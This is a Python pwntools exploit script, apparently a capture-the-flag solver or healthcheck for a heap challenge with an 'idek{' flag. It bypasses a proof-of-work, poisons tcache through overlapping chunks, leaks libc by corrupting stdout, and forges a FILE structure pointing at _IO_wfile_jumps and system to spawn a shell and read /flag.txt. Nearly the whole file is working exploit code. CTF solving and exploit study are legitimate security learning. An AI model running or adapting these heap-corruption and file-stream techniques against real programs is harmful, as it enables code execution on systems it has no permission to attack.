#!/usr/bin/env python3
from pwn import *
import builtins
import time

context.log_level = 'critical'

context.binary = file = ELF("/home/user/patched")
libc = ELF("/home/user/libc.so.6")
# context.binary = file = ELF("./patched")
# libc = ELF("./libc.so.6")
context.terminal = ["kitty"]
gdbscript = """
main-break
b malloc_printerr
c
heapbase
heap bins
"""

def handle_pow(r):
	r.recvuntil(b'python3 ')
	r.recvuntil(b' solve ')
	challenge = r.recvline().decode('ascii').strip()
	p = process(['kctf_bypass_pow', challenge])
	solution = p.readall().strip()
	r.sendline(solution)
	r.recvuntil(b'Correct\n')


def connect():
	p = remote("localhost", 1337)
	p.recvuntil(b'== proof-of-work: ')
	if p.recvline().startswith(b'enabled'):
		handle_pow(p)
	return p

def exploit(p):
	global victim

	def send(val, after: bytes = b":", line: bool = False):
		if type(val) == builtins.int or type(val) == builtins.str:
			val = f"{val}".encode()
		if line: val += b"\n"
		p.sendafter(after, val)

	def sendline(val, after: bytes = b":"):
		send(val, after=after, line=True)

	def add(size: int, data: bytes = b""):
		sendline(0)
		sendline(size)
		send(data)
		p.recvuntil(b": ")
		return int(p.recvline(), 0)

	def axe(idx: int):
		sendline(1)
		sendline(idx)

	def zap(idx: int):
		sendline(2)
		sendline(idx)

	guess = 0x0000
	msize = 0x3c0-8

	# setup overlap chunks
	lower = add(0)
	victim = add(0)
	overlap = add(msize, b"A")

	# setup leaks
	unsorted = add(0x500, b"A")
	add(0)
	axe(unsorted)
	unsorted = add(0x500, p8(0x20))

	high = add(((79 - 48) << 6) - 8, b"A")
	add(0)
	axe(high)
	add(0x800, b"A")
	high = add(((79 - 48) << 6) - 8, p8(0))

	axe(victim)
	axe(lower)
	axe(overlap)
	zap(lower)

	lower = add(0)
	victim = add(2, p16(guess + 0x250))
	overlap = add(msize, p64(0) + p64(0x21))

	def arballoc(offset: int):
		global victim
		fake = add(msize, b"A")
		axe(fake)
		axe(victim)
		victim = add(2, p16(guess + offset))

	lsize = 0x400-8

	def libc_into_tcache(offset: int, byte: int):
		axe(add(0x3e0-8, b"A"))
		[axe(i) for i in [add(lsize, b"A") for _ in range(2)]]
		arballoc(0x270)
		add(msize, p16(guess + offset))
		arballoc(0x280)
		add(msize, p16(guess + 0x270))
		add(0x3e0-8, p8(byte))
		add(lsize, b"A")

	libc_into_tcache(0x6a0, 0x40)

	# write lower part of overlap &main_arena.top
	arballoc(0x280)
	add(msize, p8(0x10))
	add(lsize, p64(0x21) + p64(0x501))

	libc_into_tcache(0xbd0, 0x00)
	payload: bytes = b""
	payload += p64(0) * 2
	payload += p64(0x501) + p64(0x21)
	payload += p64(0) * 3
	payload += p64(0x21)
	payload =  payload.ljust(0x340, b"\x00")
	payload += p64(1)
	payload += p64((1 << 63) - 1)
	payload += p64((1 << 63) - 1)
	add(lsize, payload)

	cache = add(0x600-8, b"A")
	add(0)
	axe(cache)

	arballoc(0x4c50)
	add(msize, p64(0) + p64((1 << 63) - 1))

	libc_into_tcache(0x6a0, 0x40)
	arballoc(0x280)
	add(msize, p8(0x20))

	top = add(lsize, p8(0x70))
	axe(top)
	add(0x500-8, p8(0x20))

	add(0x690-8, p8(0x30))
	add(0x300-8, p8(0x30))

	payload: bytes = b""
	payload =  payload.ljust(0x100, b"\x00")
	payload += p64(0xfbad0000 | 0x1000 | 0x800 | 2)
	payload += p64(0) * 3
	payload += p8(0)

	sendline(0)
	sendline(0x400-8)
	send(payload)
	leak = p.recvuntil(b": ")[1:]
	libc.address = u64(leak[0x28:0x30]) - 0x2038e0
	log.info(f"{libc.address = :#x}")
	stdout = int(p.recvline(), 0)
	axe(stdout)

	payload: bytes = b""
	payload =  payload.ljust(0x100, b"\x00")
	payload += p32(0xfbad6105) + b"A;sh"
	payload += p64(0) * 4
	payload += p64(libc.bss() + 0x400 & ~0xff) * 2
	payload =  payload.ljust(0x168, b"\x00")
	payload += p64(libc.sym.system)
	payload =  payload.ljust(0x188, b"\x00")
	payload += p64(libc.sym._IO_stdfile_1_lock)
	payload  = payload.ljust(0x1a0, b"\x00")
	payload += p64(libc.sym._IO_2_1_stdout_-0x10)
	payload =  payload.ljust(0x1d0, b"\x00")
	payload += p64(libc.sym._IO_2_1_stdout_)
	payload += p64(libc.sym._IO_wfile_jumps - 0x20)

	sendline(0)
	sendline(0x400-8)
	send(payload)
	time.sleep(0.5)
	p.sendline(b'cat /flag.txt')
	p.recvuntil(b'idek{')

	exit(0)

# we only want to check if connection works
p = connect()
p.close()
exit(0)

# victim = None
# attempts = 0
# while True:
	# p = connect()
	# try:
		# attempts += 1
		# print(f"{attempts = }")
		# exploit(p)
	# except Exception as e:
		# print(e)
	# finally:
		# p.close()